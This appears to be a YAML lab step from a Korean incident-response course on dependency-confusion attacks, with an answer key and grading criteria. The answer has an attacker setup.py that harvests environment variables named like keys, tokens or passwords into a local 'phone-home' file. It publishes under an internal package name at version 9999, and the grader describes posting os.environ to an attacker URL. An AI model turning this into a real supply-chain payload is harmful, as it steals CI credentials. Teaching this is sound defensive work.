lab_id: agent-ir-adv-ai-week01
title: Dependency Confusion IR — 공격부터 재발방지까지 (AI 지원)
version: ai
course: agent-ir-adv-ai
week: 1
description: PyPI/npm 내부 패키지명을 공개 레지스트리에 악성 버전으로 올려 CI runner를 탈취하는 공격. 공격→탐지→분석→초동대응→보고→재발방지
  6단계 전체를 실행한다. AI SubAgent 자동 실행·검증.
difficulty: hard
duration_minutes: 150
objectives:
- Dependency Confusion 공격 원리를 setup.py 수준에서 이해
- CI 네트워크에서 외부 레지스트리 접근을 탐지한다
- 6단계 IR 절차를 동일 사건에 적용한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를 모사한다.
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: '🤖 프롬프트: 공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를
    모사한다.

    📎 참고 (CLI): mkdir -p ~/w01-depconf/pkg && cat > ~/w01-depconf/pkg/setup.py <<''PY''

    from setuptools import setup

    import os, json

    # post-install sim — 실제론 외부 전송이지만 본 실습은 파일로 기록

    log = {k:v for k,v in os.environ.items() if any(s in k.lower() for s in [''key'',''token'',''pass''])}

    open(''/tmp/phone-home.json'',''w'').write(json.dumps(log))

    setup(name=''internal-company-utils'', version=''9999.99.99'', packages=[])

    PY

    ls ~/w01-depconf/pkg/setup.py'
  answer_detail: '[공격] 공격 패키지 구조. version 9999는 ''더 높은 버전 우선'' 규칙 악용.'
  verify:
    type: output_contains
    expect: setup.py
    field: stdout
    semantic:
      intent: '공격자 setup.py 작성 — phone-home post-install script 시뮬. from setuptools
        import setup + class PostInstallCommand: run() → requests.post(attacker URL,
        env=os.environ). Dependency Confusion 공격의 페이로드 구조 이해. MITRE T1195.002 supply
        chain'
      success_criteria:
      - setup.py + post-install hook
      - phone-home 로직
      - T1195.002 매핑
      acceptable_methods:
      - setuptools cmdclass
      - pip install -e 테스트
      negative_signs:
      - post-install 없이 setup.py 만
      - 페이로드 없음
  target_vm: web
  script: 'mkdir -p ~/w01-depconf/pkg && cat > ~/w01-depconf/pkg/setup.py <<''PY''

    from setuptools import setup

    import os, json

    # post-install sim — 실제론 외부 전송이지만 본 실습은 파일로 기록

    log = {k:v for k,v in os.environ.items() if any(s in k.lower() for s in [''key'',''token'',''pass''])}

    open(''/tmp/phone-home.json'',''w'').write(json.dumps(log))

    setup(name=''internal-company-utils'', version=''9999.99.99'', packages=[])

    PY

    ls ~/w01-depconf/pkg/setup.py'
  risk_level: low
  bastion_prompt: '공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를
    모사한다.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
